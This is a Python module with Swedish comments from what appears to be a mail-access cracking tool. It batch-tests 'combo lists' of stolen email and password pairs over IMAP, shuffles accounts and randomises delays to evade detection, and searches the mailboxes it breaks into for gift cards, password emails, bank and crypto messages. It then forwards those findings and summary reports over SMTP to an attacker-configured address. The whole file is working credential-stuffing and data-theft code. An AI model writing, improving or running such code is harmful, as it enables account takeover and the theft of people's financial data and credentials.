"""
Batch Processor för att hantera stora combo-listor effektivt
Inkluderar threading, rate limiting och progressivt crawling
"""

import threading
import time
import queue
from typing import List, Dict, Any, Callable, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import random

from core.config import Config
from core.logger import MailAccessLogger
from protocols.imap_client import IMAPClient
from protocols.smtp_client import EmailForwarder

class BatchProcessor:
    """Hanterar batch-bearbetning av stora combo-listor"""
    
    def __init__(self, config: Config, logger: MailAccessLogger):
        self.config = config
        self.logger = logger
        
        # Statistik
        self.total_accounts = 0
        self.processed_accounts = 0
        self.successful_accounts = 0
        self.failed_accounts = 0
        self.start_time = None
        
        # Rate limiting
        self.rate_limit_delay = config.delay_between_attempts
        self.max_retries = config.retry_attempts
        
        # Results storage
        self.results = []
        self.detailed_results = []
        
        # Threading
        self.thread_pool = None
        self.result_queue = queue.Queue()
        
        # Email forwarder
        self.email_forwarder = None
        if config.enable_forwarding:
            self.email_forwarder = EmailForwarder(config, logger)
            self.email_forwarder.setup_forwarding(
                config.forward_to_email,
                config.forward_from_email,
                config.forward_password,
                config.forward_smtp_server
            )
    
    def process_accounts(self, accounts: List[Dict[str, str]], 
                        progress_callback: Optional[Callable] = None) -> List[Dict[str, Any]]:
        """
        Bearbetar en lista med konton
        
        Args:
            accounts: Lista med {"email": str, "password": str}
            progress_callback: Callback för progress updates
            
        Returns:
            Lista med resultat för varje konto
        """
        self.total_accounts = len(accounts)
        self.processed_accounts = 0
        self.successful_accounts = 0
        self.failed_accounts = 0
        self.start_time = time.time()
        
        self.logger.info(f"Startar batch-bearbetning av {self.total_accounts} konton")
        self.logger.info(f"Använder {self.config.max_threads} trådar")
        
        # Randomisera ordning för att undvika pattern detection
        randomized_accounts = accounts.copy()
        random.shuffle(randomized_accounts)
        
        # Dela upp i batches för bättre minneshantering
        batch_size = min(100, self.total_accounts)
        
        try:
            with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
                self.thread_pool = executor
                
                # Processera i batches
                for i in range(0, len(randomized_accounts), batch_size):
                    batch = randomized_accounts[i:i + batch_size]
                    self._process_batch(batch, executor, progress_callback)
                    
                    # Kort paus mellan batches för att undvika överbelastning
                    if i + batch_size < len(randomized_accounts):
                        time.sleep(2)
        
        except Exception as e:
            self.logger.error(f"Fel vid batch-bearbetning: {e}")
        
        finally:
            self.thread_pool = None
        
        # Sammanställ och returnera resultat
        self._finalize_results()
        return self.detailed_results
    
    def _process_batch(self, batch: List[Dict[str, str]], 
                      executor: ThreadPoolExecutor,
                      progress_callback: Optional[Callable] = None):
        """Bearbetar en batch av konton parallellt"""
        
        # Skicka alla jobb i batchen
        future_to_account = {}
        for account in batch:
            future = executor.submit(self._process_single_account, account)
            future_to_account[future] = account
        
        # Samla resultat när de blir klara
        for future in as_completed(future_to_account):
            account = future_to_account[future]
            
            try:
                result = future.result()
                self._handle_result(result)
                
                # Progress update
                self.processed_accounts += 1
                if progress_callback:
                    progress_callback(self.processed_accounts, self.total_accounts)
                else:
                    self._default_progress_update()
                
            except Exception as e:
                self.logger.error(f"Fel vid bearbetning av {account['email']}: {e}")
                self.failed_accounts += 1
                self.processed_accounts += 1
    
    def _process_single_account(self, account: Dict[str, str]) -> Dict[str, Any]:
        """Bearbetar ett enskilt konto med retry-logik"""
        email = account['email']
        password = account['password']
        
        # Rate limiting - slumpmässig delay för att undvika pattern detection
        base_delay = self.rate_limit_delay
        random_delay = random.uniform(0.5, 1.5) * base_delay
        time.sleep(random_delay)
        
        # Skapa IMAP-klient för denna tråd
        imap_client = IMAPClient(self.config, self.logger)
        
        result = None
        last_exception = None
        
        # Retry-logik
        for attempt in range(self.max_retries + 1):
            try:
                result = imap_client.test_account(email, password)
                break  # Framgångsrikt, bryt retry-loop
                
            except Exception as e:
                last_exception = e
                if attempt < self.max_retries:
                    # Exponential backoff för retries
                    retry_delay = (2 ** attempt) * random.uniform(1, 3)
                    self.logger.debug(f"Retry {attempt + 1}/{self.max_retries} för {email} om {retry_delay:.1f}s")
                    time.sleep(retry_delay)
                else:
                    self.logger.error(f"Misslyckades med {email} efter {self.max_retries} försök: {e}")
        
        # Om alla retries misslyckades
        if result is None:
            result = {
                'email': email,
                'status': 'error',
                'accessible': False,
                'error': str(last_exception) if last_exception else 'Okänt fel',
                'crawl_results': {}
            }
        
        return result
    
    def _handle_result(self, result: Dict[str, Any]):
        """Hanterar resultat från en kontotest"""
        status = result.get('status', 'unknown')
        email = result.get('email', 'unknown')
        
        # Lägg till i results
        self.detailed_results.append(result)
        
        # Uppdatera statistik
        if status == 'valid':
            self.successful_accounts += 1
            
            # Logga framgång
            message_count = result.get('message_count', 0)
            self.logger.success(f"FRAMGÅNG: {email} - {message_count} meddelanden")
            
            # Hantera crawling-resultat
            crawl_results = result.get('crawl_results', {})
            if crawl_results and any(crawl_results.values()):
                self._handle_crawl_findings(email, crawl_results)
                
        elif status == 'invalid':
            self.failed_accounts += 1
            self.logger.debug(f"Ogiltigt: {email}")
            
        else:
            self.failed_accounts += 1
            self.logger.debug(f"Fel/Okänt: {email} - {status}")
    
    def _handle_crawl_findings(self, email: str, crawl_results: Dict[str, Any]):
        """Hanterar funna crawling-resultat"""
        findings = []
        
        # Logga vad som hittades
        if crawl_results.get('gift_cards'):
            count = len(crawl_results['gift_cards'])
            findings.append(f"🎁 {count} presentkort")
            
        if crawl_results.get('passwords'):
            count = len(crawl_results['passwords'])
            findings.append(f"🔐 {count} lösenordsmail")
            
        if crawl_results.get('bank_info'):
            count = len(crawl_results['bank_info'])
            findings.append(f"💳 {count} bankmail")
            
        if crawl_results.get('crypto_info'):
            count = len(crawl_results['crypto_info'])
            findings.append(f"₿ {count} kryptomail")
        
        if findings:
            findings_str = ", ".join(findings)
            self.logger.info(f"   └─ {email}: {findings_str}")
            
            # Skicka via email forwarding om konfigurerat
            if self.email_forwarder:
                try:
                    self.email_forwarder.forward_findings(email, crawl_results)
                except Exception as e:
                    self.logger.error(f"Fel vid email forwarding för {email}: {e}")
    
    def _default_progress_update(self):
        """Standard progress update"""
        if self.processed_accounts % 10 == 0 or self.processed_accounts == self.total_accounts:
            elapsed = time.time() - self.start_time
            rate = self.processed_accounts / elapsed if elapsed > 0 else 0
            
            self.logger.info(
                f"Progress: {self.processed_accounts}/{self.total_accounts} "
                f"({(self.processed_accounts/self.total_accounts)*100:.1f}%) - "
                f"Framgång: {self.successful_accounts} - "
                f"Hastighet: {rate:.1f}/sek"
            )
    
    def _finalize_results(self):
        """Slutför batch-bearbetning och skicka sammanfattning"""
        end_time = time.time()
        duration = end_time - self.start_time
        
        self.logger.info(f"\nBatch-bearbetning slutförd på {duration:.2f} sekunder")
        self.logger.info(f"Framgångsrika konton: {self.successful_accounts}/{self.total_accounts}")
        
        if duration > 0:
            rate = self.total_accounts / duration
            self.logger.info(f"Genomsnittlig hastighet: {rate:.2f} konton/sekund")
        
        # Skicka sammanfattningsrapport
        if self.email_forwarder and self.successful_accounts > 0:
            try:
                self.email_forwarder.send_summary_report(self.detailed_results)
                self.logger.info("Sammanfattningsrapport skickad")
            except Exception as e:
                self.logger.error(f"Fel vid sändning av sammanfattningsrapport: {e}")
    
    def get_statistics(self) -> Dict[str, Any]:
        """Returnerar detaljerad statistik"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        return {
            'total_accounts': self.total_accounts,
            'processed_accounts': self.processed_accounts,
            'successful_accounts': self.successful_accounts,
            'failed_accounts': self.failed_accounts,
            'success_rate': (self.successful_accounts / self.total_accounts * 100) if self.total_accounts > 0 else 0,
            'elapsed_time': elapsed,
            'processing_rate': (self.processed_accounts / elapsed) if elapsed > 0 else 0
        }
    
    def stop_processing(self):
        """Stoppar pågående bearbetning (för graceful shutdown)"""
        if self.thread_pool:
            self.logger.info("Stoppar batch-bearbetning...")
            self.thread_pool.shutdown(wait=False)